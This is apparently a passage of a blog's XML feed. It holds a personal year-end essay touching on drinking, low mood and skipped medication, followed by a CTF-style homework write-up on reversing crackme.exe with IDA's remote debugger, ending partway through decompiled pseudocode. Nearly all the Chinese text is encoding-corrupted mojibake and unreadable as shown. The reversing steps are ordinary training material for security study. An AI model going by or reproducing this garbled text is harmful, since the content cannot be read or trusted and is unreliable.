        <content type="html"><![CDATA[<p>2023å¹´å¥½åƒè¿‡çš„å¹¶ä¸å¥½ï¼Œä½†æ˜¯å…·ä½“å‘ç”Ÿäº†ä»€ä¹ˆæˆ‘å´ä¸€ç‚¹å°è±¡éƒ½æ²¡æœ‰äº†ï¼Œç°åœ¨æˆ‘ååœ¨ä¹å±±è·¯è¾¹ï¼Œçœ‹ç€æ—è¾¹è€€çœ¼çš„çƒŸèŠ±ï¼Œç¿»æ‰‹æœºç›¸å†Œï¼Œå›é¡¾è¿™æµ‘æµ‘å™©å™©çš„ä¸€å¹´ã€‚</p><p>ä¸€æœˆäºŒå·äººç”Ÿç¬¬ä¸€æ¬¡çƒ«å¤´ï¼Œä»¥å¤§å¤±è´¥å‘Šç»ˆã€‚ç¬¬ä¸€æ¬¡å»é…’å§ï¼Œå–äº†ç¬¬ä¸€æ¯ä¸€ç‚¹ä¹Ÿä¸å¥½å–çš„çº¢è‰²çš„é¸¡å°¾é…’ï¼Œä¸ºä»€ä¹ˆç‚¹æ˜¯å› ä¸ºé‚£æ˜¯å½“æ—¶åº—é‡Œé¢åº¦æ•°æœ€é«˜çš„é…’ï¼Œè¿™ä¹Ÿä¸ºæˆ‘ä¹‹åè¿™æµ‘å™©çš„é†‰é…’ç”Ÿæ´»åŸ‹ä¸‹äº†ä¼ç¬”ã€‚ã€‚ä¸€æœˆäº”å·ï¼Œç”Ÿæ—¥å½“å¤©è¿‡çš„è¿˜ç®—å¼€å¿ƒç„¶è€Œæˆ‘ä»Šå¹´ç¬¬ä¸€æ¬¡å¬ã€Šç½‘æ˜“äº‘ã€‹å°±æ˜¯ä¸€æœˆäº”å·ç„¶åå°±å¬äº†ä½ å—ä¸€æ•´å¹´ã€‚åæ¥å’ŒåŠå“¥å»å®½çª„å··å­åƒä¸œå¡è‚˜å­ï¼Œå¯ä»¥è¯´ä»Šå¹´åƒçš„å¥½åƒçš„éƒ½æ˜¯åŠå“¥å¸¦æˆ‘å»çš„è¿˜æ˜¯ç›¸å½“æ„ŸåŠ¨å“ˆã€‚</p><p>äºŒæœˆä»½ï¼ŒæŠ¥äº†urbanè¯¾é™¤äº†å°æ—¶å€™è·³çš„ä¸¤å¹´æ‹‰ä¸èˆä¹‹å¤–åˆä¸€æ¬¡æŒ‰ç…§è‡ªå·±çš„æ„æ„¿è·³èˆğŸ’ƒï¼ŒæŒºæœ‰æ„æ€çš„å“ˆå“ˆå“ˆã€‚è¿˜æœ‰å‘¢ï¼Œå’Œé‚£ç¾¤å¾ˆå¥½å¾ˆå¥½çš„æœ‹å‹å»339å–é…’é€šå®µåœ¨å¤§é©¬è·¯ä¸Šå‘ç–¯åœ¨å¿˜è®°äº†åå­—çš„æ¹–æ—è¾¹å›å¿†è¿‡å»ç„¶ååœ¨é¾™æ³‰å±±çœ‹ä¸å­˜åœ¨çš„æ—¥å‡ºã€‚è¿™ä¸€åˆ‡å¥½åƒéƒ½å‘ç”Ÿåœ¨æ˜¨å¤©ä¹Ÿå¥½åƒå·²ç»æ˜¯å¥½ä¹…å¥½ä¹…ä¹‹å‰çš„äº‹æƒ…äº†ã€‚</p><p>ä¸‰æœˆä»½å››æœˆä»½éƒ½è¿‡å¾—ä¸å¥½ï¼Œç¿»çœ‹æ—¥è®°æƒ³èµ·é‚£æ®µæ—¶é—´ç–¯ç‹‚è¿·æ‹çš„äººï¼Œæƒ³èµ·æ¥ä»–ç¬¬ä¸€æ¬¡å¸¦æˆ‘å»é‚£å®¶é…’é¦†å–é…’ç„¶åæ‰“è½¦å»ä»–å®¶ç¡è§‰ç¬¬äºŒå¤©è¢«è¾…å¯¼å‘˜æ‰“ç”µè¯å«èµ·æ¥ã€‚ç„¶åæ²¡è¿‡å¤šä¹…å°±ç»™é«˜ä¸­é‚£ä½ç”·å£«ç¬¬ä¸€æ¬¡çœŸæ­£æ„ä¹‰ä¸Šçš„è¡¨ç™½ã€‚å½“æˆ‘å†æ¬¡æ­£è§†è¿™ä¸€åˆ‡çš„æ—¶å€™æˆ‘æ˜ç™½ä¸–ç•Œæ˜¯ä¸€åœºå·¨å¤§çš„èˆå°å‰§ï¼Œæˆ‘å´åœ¨æ¼”æˆçš„è¿‡ç¨‹ä¸­å‡æˆçœŸåšï¼Œè¯´æ˜¯è¿·å¤±è‡ªå·±ä¹Ÿå¥½ï¼Œè¯´æ˜¯è‡ªæ¬ºæ¬ºäººä¹Ÿç½¢ï¼Œäº‹å®å°±æ˜¯æˆ‘ä¸€è¾¹è®¨åŒè¿™ä¸€åˆ‡ä¸€è¾¹ç»§ç»­è¡¨æ¼”ã€‚</p><p>ä¹‹åå°±æ˜¯ä¸€æ®µæ··ä¹±çš„å¼€å§‹ï¼Œæ··ä¹±çš„ç”Ÿæ´»ï¼Œæ··ä¹±çš„æ„Ÿæƒ…ï¼Œæ··ä¹±çš„å­¦ä¹ ã€‚å”¯ä¸€çš„æ¬£æ…°å¯èƒ½æ˜¯é‡æ‹¾äº†æ‘„å½±ï¼Œå»äº†äººç”Ÿç¬¬ä¸€åœºçº¿ä¸‹èµ›ï¼Œæ‰“äº†ç¬¬ä¸€ä»½é è‡ªå·±å®åŠ›è·å¾—çš„å·¥ä½œï¼Œå†™äº†ç¬¬ä¸€ä¸ªå®Œæ•´çš„å°è¯´ã€‚</p><p>ç„¶åå‘¢ï¼Œä¹‹åçš„å¾ˆé•¿ä¸€æ®µæ—¶é—´éƒ½åœ¨ä¸ºäº†æŠ¤ç½‘è€Œçƒ¦æ¼ï¼Œç¬¬ä¸€æ¬¡æ¥è§¦è¿™ä¸ªå¹¶ä¸ç®—å•çº¯çš„ç¤¾ä¼šä¹Ÿç¬¬ä¸€æ¬¡ä¸€ä¸ªäººå‡ºè¿œé—¨åˆ°äº†å¦ä¸€ä¸ªåŸå¸‚ï¼Œåƒä¸€ä¸ªå¤§äººä¸€æ ·ä¸Šç­ä¸‹ç­ï¼Œåº”é…¬ï¼Œæ£æ‘©äººæƒ…ä¸–æ•…ï¼Œå¥½åƒä¸€å¤œä¹‹é—´åˆé•¿å¤§å¥½å¤šã€‚æŠ¤ç½‘ç»“æŸä¹‹åå·¥ä½œå’Œå­¦ä¹ æ„Ÿè§‰éƒ½åœæ»äº†ï¼Œåˆè®¤è¯†äº†è§£æ–°çš„äººï¼Œå¼€å§‹å†™é‚£äº›çŸ«æ‰é€ ä½œçš„æ–‡å­—ã€‚æ¸æ¸çš„æˆ‘å‘ç°æ„Ÿæƒ…å®åœ¨ä¸æ˜¯ä¸€ä¸ªé«˜å°šçš„ä¸œè¥¿ï¼Œä»è¿·æ‹åˆ°ç–¯ç‹‚ç—´è¿·åˆ°æ¶å¿ƒåˆ°å†·æ¼ ç›´åˆ°æ— è¯å¯è¯´åªéœ€è¦ä¸åˆ°ä¸¤ä¸ªæœˆçš„æ—¶é—´ï¼Œæˆ‘ä¹Ÿå¯ä»¥åœ¨ä»…ä»…ä¸¤ä¸ªæœˆä¹‹å†…å°±å‘ç”Ÿç¿»å¤©è¦†åœ°çš„å˜åŒ–ï¼Œå°±åƒæˆ‘å·²ç»æ— æ³•æƒ³è±¡ä»Šå¹´å¹´åˆçš„æˆ‘æ˜¯æ€æ ·çš„äº†ã€‚è¿˜æœ‰å¤ªå¤šå¤ªå¤šçš„äººå’Œäº‹ï¼Œæˆ‘è¯´ä¸å‡ºæ¥ï¼Œä½†æˆ‘è§‰å¾—æˆ‘å’Œä»–ä»¬çš„ç¼˜åˆ†åœ¨ä¸€å¤©ä¸€å¤©çš„æ¶ˆæ•£ã€‚åˆ°äº†æœ€åï¼Œæˆ‘æ˜¯å¦ä¼šå¿˜è®°äº†æ‰€æœ‰ï¼Œç„¶åè¿‡ç€ä¸€çœ¼å°±æœ›åˆ°å¤´çš„æœä¹æ™šäº”çš„ç”Ÿæ´»å‘¢ã€‚æˆ‘æœ‰çš„æ—¶å€™å¾ˆæ¸´æœ›é‚£æ ·çš„ç”Ÿæ´»ï¼Œè¿™è®©æˆ‘æ„Ÿè§‰è‡ªå·±æ˜¯ä¸€ä¸ªå¤§äººï¼Œæ˜¯ä¸€ä¸ªç»æµè‡ªç”±è´¢å¯Œè‡ªç”±çš„ç”Ÿæ´»çš„ä¸»äººï¼Œä½†æˆ‘çŸ¥é“è¿™éƒ½æ˜¯éª—å±€ï¼Œæˆ‘ä¸è¿‡æ˜¯è¢«ä¸€äº›ä¸œè¥¿é®ä½äº†çœ¼ç›ã€‚å°±åƒæˆ‘ä¸åœçš„è¯´æˆ‘è®¨åŒæŸäººçœ‹ä¸èµ·æŸäººä½†æˆ‘åŠªåŠ›çš„ç›®çš„åˆ°å¤´æ¥ä¹Ÿä¸è¿‡æ˜¯è¶…è¿‡é‚£äº›æˆ‘æ‰€åŒæ¶çš„äººè¯•å›¾ç”¨æˆ‘çš„æ–¹æ³•æ¥è¯æ˜æˆ‘æ˜¯å¯¹çš„ã€‚æˆ‘å¤ªæƒ³å»è¯æ˜äº†ï¼Œè¿™ä¹ˆå¤šå¹´ï¼Œä»é«˜ä¸­å¼€å§‹ï¼Œç¬¬ä¸€æ¬¡å’Œç­ä¸»ä»»å¯¹ç€å¹²å¼€å§‹ï¼Œæˆ‘å°±å¹»æƒ³ç€å‘æ‰€æœ‰äººè¯æ˜ã€‚ç«èµ›å¸¦ç»™æˆ‘çš„åˆ°åº•æ˜¯ä»€ä¹ˆå‘¢ï¼Œæˆ‘è¶Šæ¥è¶Šè¯´ä¸æ˜ç™½ä½†æˆ‘çŸ¥é“å®ƒç»™æˆ‘çš„ä¼¤ç—›å°†è®©æˆ‘ç”¨å°½ä¸€ç”Ÿå»æ²»æ„ˆã€‚</p><p>è€ŒCTFå‘¢ï¼ŒWebå‘¢ï¼Œæˆ‘æ˜ç™½ä»–ä»¬æ˜¯æ¢äº†ä¸€ä¸ªåŒ…è£…çš„å¦ä¸€ä¸ªblack holeä¼šæ¸æ¸å¸èµ°æˆ‘èº«ä¸Šçš„æŸç§ä¸œè¥¿ã€‚ä½†æˆ‘ä¸åœ¨ä¹äº†ï¼Œåœ¨æˆ‘ç¬¬ä¸€æ¬¡ä¸¢ä¸‹å“²å­¦ï¼Œç¬¬ä¸€æ¬¡ä¸¢æ‰è¥¿è¥¿å¼—æ–¯çš„å·¨çŸ³ç„¶åèµ°å‘å·´åº“æ–¯ï¼Œè¿™ä¸€è·¯ä¸Šå¤ªå¤šä¸œè¥¿å˜äº†æˆ‘ä¹Ÿä¸å†æ˜¯ä»€ä¹ˆä¹Ÿä¸åœ¨ä¹çš„å°‘å¹´ã€‚æ‰€ä»¥æˆ‘ä¸æ–­å›å¿†è¿‡å»ï¼Œæˆ‘çŸ¥é“è¿‡å»çš„æˆ‘å¾ˆè€€çœ¼å¾ˆä¼˜ç§€ä½†æ˜¯æˆ‘ä¹Ÿæ˜¯äº²æ‰‹æŠŠæˆ‘å˜æˆäº†å¦ä¸€ä¸ªäººï¼Œå¦ä¸€ä¸ªä¸ä¼¦ä¸ç±»çš„å°ä¸‘ã€‚</p><p>å½“æˆ‘æ„è¯†åˆ°æˆ‘å·²ç»ç—…äº†çš„æ—¶å€™ï¼Œå·²ç»ååœ¨åŒ»é™¢èµ°å»Šï¼Œæ‰‹é‡Œé¢æ˜¯ä¸¤å¼ å¾ˆè½»å¾ˆè½»çš„æŠ¥å‘Šå•ï¼Œä½†æ˜¯è¿™ä¸èƒ½è¯´æ˜ä»€ä¹ˆï¼ŒåŒ»ç”Ÿç»™æˆ‘å¼€çš„è¯æˆ‘æ²¡æœ‰ä¹°ï¼Œé‚£äº›åŠè°çš„è¯è¯­æˆ‘æ²¡æœ‰å¬ï¼Œå¥½åƒç»ˆäºæ´»æˆäº†è‡ªå·±æ¢¦é‡Œé¢çš„æ¨¡æ ·ã€‚æˆ‘è®°å¾—å¥¹çœ‹å®Œæˆ‘å†™çš„éšç¬”åè¯´æˆ‘â€å‹æŠ‘åˆç–¯ç‹‚â€ï¼Œä½†å¥¹å¸®ä¸äº†æˆ‘ï¼Œæ²¡æœ‰äººèƒ½å¸®çš„äº†æˆ‘ï¼Œè¯´åˆ°åº•è¿™å°±æ˜¯æˆ‘ä¹Ÿè®¸æ‰æ˜¯æˆ‘æƒ³è¦çš„ç»“æœã€‚é‚£äº›çª’æ¯çš„æ—¶åˆ»ï¼Œé‚£äº›è‡ªæˆ‘æ„ŸåŠ¨çš„æ—¶åˆ»ï¼Œæˆ‘ä¸æƒ³å‘Šè¯‰ä»»ä½•äººå› ä¸ºæˆ‘æ ¹æœ¬å¼€ä¸äº†å£ï¼Œæˆ‘åªæ˜¯ä¸€ä¸ªåŠ²çš„å¬æ­Œï¼Œå› ä¸ºæˆ‘å“­ä¸å‡ºæ¥ï¼Œå¾ˆä¹…å¾ˆä¹…ä¹‹å‰ï¼Œæˆ‘å°±å‘ç°ï¼Œè‡ªå·±ä¸€æ»´æ³ªä¹Ÿæµä¸å‡ºæ¥äº†ã€‚</p><p>å¥½å§ï¼Œè¿™åªæ˜¯ä¸€ä¸ªå¹´ç»ˆæ€»ç»“ï¼Œæˆ‘ä¸è¯¥è€æ˜¯è¯´è¿™äº›æ²¡æœ‰æ„ä¹‰çš„è¯ã€‚æˆ‘çŸ¥é“æˆ‘å¬äº†ä¸€æ•´å¹´ã€Šç½‘æ˜“äº‘ã€‹ï¼Œä¹Ÿéš¾è¿‡äº†ä¸€æ•´å¹´ã€‚å¯æ˜¯ä¹Ÿæœ‰å¾ˆå¤šå¥½çš„ä¸œè¥¿å‘ç”Ÿäº†ä¸æ˜¯å—ï¼Œæˆ‘åƒçš„è··è„šç‰›è‚‰å’Œé‚£å‡ ç¢—é¥­ä¹Ÿå€¼å¾—æˆ‘ç‚«è€€ä¸€è¾ˆå­ä¸æ˜¯å—ï¼Œå“ˆå“ˆã€‚æˆ‘åƒè¿‡é‚£ä¹ˆå¤šå¥½åƒçš„ï¼Œè¿˜é‡è§äº†é‚£ä¹ˆæœ‰è¶£çš„äººï¼Œä¸è®ºæ˜¯ä¸æ„¿æ‰¿è®¤çš„å–œæ¬¢çš„äººï¼Œè¿˜æ˜¯åˆ»æ„å–œæ¬¢çš„äººï¼Œè¿˜æ˜¯å·²ç»åœ¨æ„äº†å‡ å¹´ç›´åˆ°ç°åœ¨ä¹Ÿæ²¡åŠæ³•é‡Šç„¶çš„äººï¼Œæˆ‘çˆ±çš„äººï¼Œçˆ±æˆ‘çš„äººã€‚å…œå…œè½¬è½¬ï¼Œæ»¡æ˜¯å›å¿†ã€‚æœ€åå†å½“å‡ å¤©åå¤šå²çš„å°å±å­©ï¼Œæˆ‘å°±è«åå…¶å¦™å˜æˆå¥”ä¸‰çš„è€äººï¼Œä»¥å‰æ€»è§‰å¾—æ—¶é—´è¿˜é•¿ï¼Œä½†å®ƒçœŸçš„è¿‡å¾—å¾ˆå¿«ã€‚ä¸€é¦–æ­Œé‡Œé¢å†™ï¼Œâ€ä»–ä»¬è¯´ï¼Œéšç€å¹´é¾„çš„å¢é•¿ï¼Œä¸€å¹´çš„ç›¸å¯¹æ—¶é•¿ä¼šå˜çŸ­ï¼Œä¸€å¹´çš„æ¯”ç‡åœ¨äººç”Ÿä¸­ä¼šè¶Šå˜è¶Šå°ï¼Œæ‰€ä»¥æ—¶é—´å˜å¾—è¶Šæ¥è¶Šå¿«ã€‚â€æˆ‘è®¤ä¸ºå¾ˆæœ‰é“ç†ï¼Œæ‰€ä»¥æˆ‘ä¸è¦å†è¢«å›°åœ¨è¿‡å»äº†ï¼Œæˆ‘è¦æ„Ÿå—å½“ä¸‹ï¼Œæ„Ÿå—å½“ä¸‹çš„æ¯ä¸€åˆ†æ¯ä¸€ç§’ã€‚</p><p>2023çš„æœ€åå‡ ä¸ªæœˆæ˜¯ç”±æ— æ•°ä¸ªé»‘å¤œæ„æˆçš„ã€‚æˆ‘è®°å¾—æˆ‘ååœ¨ä¸œéƒŠè®°å¿†çš„è·¯è¾¹ç‚¹ç‡ƒäº†äººç”Ÿç¬¬ä¸€æ ¹çƒŸï¼Œååœ¨ä¸€ä¸ªå°åŒºé—¨å£æ•°ç€æ—¶é—´ç­‰å¤©äº®ï¼Œè®°å¾—æ— æ•°ä¸ªæ·±å¤œèº²åœ¨ç”µè„‘é¢å‰å¥‹æ–—ï¼Œå¹»æƒ³è‡ªå·±æŸä¸€å¤©ä¹Ÿå¯ä»¥å˜å¾—å¾ˆæˆåŠŸå¾ˆä¼˜ç§€ï¼Œè®°å¾—æ— æ•°æ¬¡åœ¨é…’å§é‡Œå¤§å£å¤§å£çš„ç½ç€çƒˆé…’ï¼Œåœ¨æˆ‘æœ€å–œæ¬¢çš„å°é…’é¦†å‘ç”Ÿä¸€äº›ä¹Ÿè®¸ä¼šéš¾å¿˜ç»ˆç”Ÿçš„äº‹æƒ…ã€‚å’Œé‚£ä½æˆ‘æ°¸è¿œçœ‹ä¸é€çš„äººååœ¨ä¸€èµ·äº’ç›¸å¦ç™½è¿™è¿™äº›å¹´è¯´ä¸å‡ºå£çš„ç§˜å¯†å¥½åƒè¦æŠŠè¿™ä¸€åˆ‡é»‘æš—çš„ï¼Œäººæ€§çš„ï¼Œéš¾ä»¥å¯é½¿çš„äº‹æƒ…éƒ½æ€æ­»åœ¨çƒˆæ—¥ä¹‹ä¸‹ã€‚åœ¨æœ›æ±Ÿè·¯ä¸Šå’Œå¥¹æ•£æ­¥ç„¶åå»æ²³è¾¹å¹é£äº’ç›¸ç¥å¯¹æ–¹å¹¸ç¦ï¼Œå¿ƒé‡Œé¢å´å·²ç»æ˜ç™½æœ‰äº›ä¸œè¥¿å·²ç»èµ°åˆ°å°½å¤´ã€‚æˆ‘çˆ±é»‘å¤œï¼Œå´ä»æœªæŠ¬å¤´çœ‹è¿‡å¤©ä¸Šçš„æœˆäº®ã€‚æˆ‘çˆ±æ—¥å‡ºï¼Œå´åªæ˜¯ç”¨é•œå¤´æ‹ä¸‹é‚£äº›æ©˜å­æµ·ç”šè‡³æ²¡æœ‰çœŸæ­£é™ä¸‹å¿ƒæ¥è§‚çœ‹å“ªæ€•ä¸€æ¬¡å®Œæ•´çš„è¿‡ç¨‹ã€‚</p><p>2022å¹´åº•æˆ‘å¸Œæœ›è¿™ä¸€å¹´èƒ½æ›´åŠ åŠªåŠ›ï¼Œå®é™…ä¸Šä»Šå¹´æœ‰æ²¡æœ‰æ›´åŠ åŠªåŠ›å‘¢ï¼Œæˆ‘ä¸çŸ¥é“ã€‚</p><p>è‡³äº2024ï¼Œæˆ‘æ˜¯åœ¨ä¸çŸ¥é“è¯¥è¯´ä»€ä¹ˆï¼Œæˆ‘åªå¸Œæœ›ï¼Œæˆ‘èƒ½åˆ«åœ¨ä¸¢æ‰æˆ‘èº«ä¸Šçš„é‚£äº›ä¸œè¥¿äº†ï¼Œä¸ç®¡æ˜¯å¥½çš„è¿˜æ˜¯åçš„ï¼Œæˆ‘éƒ½æƒ³ç•™ä¸‹ï¼Œè‡³å°‘ä¸è¦åªå‰©ä¸‹ç©ºç™½å’Œéº»æœ¨ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Life </category>
          
          <category> éšç¬” </category>
          
      </categories>
      
      
        <tags>
            
            <tag> éšç¬” </tag>
            
            <tag> å¹´åº¦æ€»ç»“ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>èè‹±ç­æ¸¸æˆå®‰å…¨ç¬¬ä¸€æ¬¡ä½œä¸š</title>
      <link href="/2023/12/21/tx%E8%8F%81%E8%8B%B1%E7%8F%AD%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8(%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0)/"/>
      <url>/2023/12/21/tx%E8%8F%81%E8%8B%B1%E7%8F%AD%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8(%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0)/</url>
      
        <content type="html"><![CDATA[<h2 id="ç¬¬ä¸€æ¬¡ä½œä¸š"><a href="#ç¬¬ä¸€æ¬¡ä½œä¸š" class="headerlink" title="ç¬¬ä¸€æ¬¡ä½œä¸š"></a>ç¬¬ä¸€æ¬¡ä½œä¸š</h2><h3 id="1-åˆ†æå¹¶è°ƒè¯•ç¨‹åºï¼Œæ‰¾åˆ°flag"><a href="#1-åˆ†æå¹¶è°ƒè¯•ç¨‹åºï¼Œæ‰¾åˆ°flag" class="headerlink" title="1.åˆ†æå¹¶è°ƒè¯•ç¨‹åºï¼Œæ‰¾åˆ°flag"></a>1.åˆ†æå¹¶è°ƒè¯•ç¨‹åºï¼Œæ‰¾åˆ°flag</h3><p>ä½¿ç”¨æŠ€æœ¯ï¼šIDAåŠ¨æ€è°ƒè¯•crackme.exe</p><h4 id="å‰ç½®çŸ¥è¯†ç‚¹"><a href="#å‰ç½®çŸ¥è¯†ç‚¹" class="headerlink" title="å‰ç½®çŸ¥è¯†ç‚¹"></a>å‰ç½®çŸ¥è¯†ç‚¹</h4><blockquote><p> æ­¥éª¤</p></blockquote><p>1.æ‰¾åˆ°æ–‡ä»¶å¤¹IDAç›®å½•ä¸‹çš„dbgsrvæ–‡ä»¶å¤¹ï¼Œæ‰¾åˆ°å¯¹åº”ç‰ˆæœ¬çš„win_32æˆ–è€…64remote.exeï¼Œç‚¹å‡»è¿è¡Œã€‚</p><p>2.æ‰“å¼€idaï¼Œå°†exeæ‹–å…¥ï¼ŒDebugger â†’ Select a debugger â†’ Remote windows debugger</p><p>3.Debugger â†’ process options â†’ å¡«å†™ä¸‰è¡Œ(ç¬¬ä¸€ï¼ŒäºŒè¡Œä¸º æ–‡ä»¶çš„è·¯å¾„ï¼Œç¬¬ä¸‰è¡Œä¸ºç©ºï¼Œä¹Ÿå¯è®¾ç½®ä¸ºæ–‡ä»¶å¯¹åº”çš„æ ¹ç›®å½•) å’Œ Hostnameè®¾ä¸º127.0.0.1ï¼ˆä»£è¡¨æœ¬æœºï¼‰ â†’ ok</p><p>4.é™„åŠ ç¨‹åºï¼šå…ˆè¿è¡Œæˆ‘ä»¬è¦è°ƒè¯•çš„è½¯ä»¶ï¼Œç„¶åDebugger â†’ Attach to processâ€¦ â†’ é€‰ä¸­æˆ‘ä»¬è¦è°ƒè¯•çš„ç¨‹åº â†’ attach</p><blockquote><p> å¿«æ·é”®</p></blockquote><p>1.F2ä¸‹æ–­ç‚¹<br>2.F7ï¼Œf8å•æ­¥æ­¥å…¥<br>3.Né‡å<br>4.gè·³åˆ°åœ°å€å’Œå‡½æ•°å<br>5.uå–æ¶ˆæŠŠå‡½æ•°æ±‡ç¼–å˜æˆæœºå™¨ç <br>6.cå°±æ˜¯æŠŠæœºå™¨ç å˜æˆæ±‡ç¼–<br>7.F5<br>8.påˆ†æå‡½æ•°ï¼ŒæŠŠæœºå™¨ç é‚£äº›ä¸œè¥¿ç¿»è¯‘æˆå‡½æ•°<br>9.ctrl+sçœ‹è§ç³»ç»Ÿæ‰€æœ‰çš„æ¨¡å—<br>10.ctrl+fæœç´¢<br>11.å•æ­¥è°ƒè¯•æ³¨æ„å³ä¸Šè§’ï¼Œå¯„å­˜å™¨å˜è“è‰²è¡¨ç¤ºè¢«æ”¹äº†<br>12.otions-&gt;number of opcode byteså¯ä»¥æŸ¥çœ‹æœºå™¨ç ï¼Œå¡«å…¥4ä¸€è¡Œçœ‹4ä¸ªæœºå™¨ç <br>13.åœ¨hex view-1æŒ‰F2å¯ä»¥ä¿®æ”¹æœºå™¨ç ï¼Œå†æ¬¡æŒ‰F2ç¡®å®šä¿®æ”¹<br>14.alt+gçœ‹æ˜¯thumbè¿˜æ˜¯armæŒ‡ä»¤<br>15.åœ¨å‡½æ•°åä¸ŠæŒ‰Xå¯ä»¥çœ‹è§ä¸Šå±‚è°ƒç”¨<br>16.åœ¨f5ä¼ªc&#x2F;c++ä»£ç çš„æƒ…å†µä¸‹ï¼Œæ³¨é‡Šæ˜¯&#x2F;ï¼Œæ±‡ç¼–æƒ…å†µä¸‹æ³¨é‡Šæ˜¯;<br>17.f4ç§»åŠ¨åˆ°å…‰æ ‡å¤„<br>18.åœ¨å¯„å­˜å™¨çª—å£æŒ‰Eå¯ä»¥ä¿®æ”¹å¯„å­˜å™¨çš„å€¼<br>19.åœ¨å†…å­˜çª—å£f2å¯ä»¥ä¿®æ”¹å†…å­˜çš„å€¼</p><p>ctrl+F7ï¼šè¿è¡Œè‡³å‡½æ•°ç»“æŸï¼Œç”¨æ¥è·³å‡ºå‡½æ•°</p><p>ctrl+F2ï¼šé‡æ–°å¼€å§‹è°ƒè¯•</p><h4 id="å…³äºæœ¬é¢˜"><a href="#å…³äºæœ¬é¢˜" class="headerlink" title="å…³äºæœ¬é¢˜"></a>å…³äºæœ¬é¢˜</h4><ul><li>è¿›å…¥IDAåŠ¨æ€debugï¼Œæ‰“æ–­ç‚¹åˆ°<code>sub_7FF755DA14D0()</code>å‘ç°è¿™ä¸ªå‡½æ•°è¿›è¡Œäº†printf(â€˜è¯·è¾“å…¥flag:â€™)æ“ä½œ</li><li>çŒœæµ‹ä¸‹ä¸€ä¸ªå‡½æ•°å°±è¿›è¡Œflagè¾“å…¥çš„éªŒè¯ï¼Œå³<code>sub_7FF755DA1020(&amp;v34);</code></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">sub_7FF755DA1020(&amp;v34);</span><br><span class="line">  CreateThread(<span class="number">0</span>i64, <span class="number">0</span>i64, StartAddress, <span class="number">0</span>i64, <span class="number">0</span>, <span class="number">0</span>i64);</span><br><span class="line">  sub_7FF755DA1070(&amp;unk_7FF755DC5600, v37);</span><br><span class="line">  v35[<span class="number">0</span>] = xmmword_7FF755DC5618;</span><br><span class="line">  v36 = <span class="number">85</span>;</span><br><span class="line">  v35[<span class="number">1</span>] = xmmword_7FF755DC5628;</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">  v15 = (<span class="type">char</span> *)v35 + <span class="number">4</span>;</span><br><span class="line">  v16 = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_7FF755DC5670);</span><br><span class="line">  v17 = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_7FF755DC56C0);</span><br><span class="line">  v18 = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_7FF755DC5690);</span><br><span class="line">  v34 = _mm_load_si128((<span class="type">const</span> __m128i *)&amp;xmmword_7FF755DC56B0);</span><br><span class="line">  v19 = v34.m128i_i32[<span class="number">0</span>];</span><br><span class="line">  v20 = _mm_cvtsi32_si128(<span class="number">5u</span>);</span><br><span class="line">  v21 = _mm_cvtsi32_si128(<span class="number">0x1F</span>u);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v15 += <span class="number">8</span>;</span><br><span class="line">    v22 = _mm_add_epi32(_mm_shuffle_epi32(_mm_cvtsi32_si128(v0), <span class="number">0</span>), v16);</span><br><span class="line">    v23 = _mm_add_epi32(_mm_shuffle_epi32(_mm_cvtsi32_si128(v0 + <span class="number">4</span>), <span class="number">0</span>), v16);</span><br><span class="line">    v0 += <span class="number">8</span>;</span><br><span class="line">    v24 = _mm_sra_epi32(</span><br><span class="line">            _mm_add_epi32(</span><br><span class="line">              (__m128i)_mm_shuffle_ps(</span><br><span class="line">                         (__m128)_mm_mul_epi32(_mm_unpacklo_epi32(v22, v22), v17),</span><br><span class="line">                         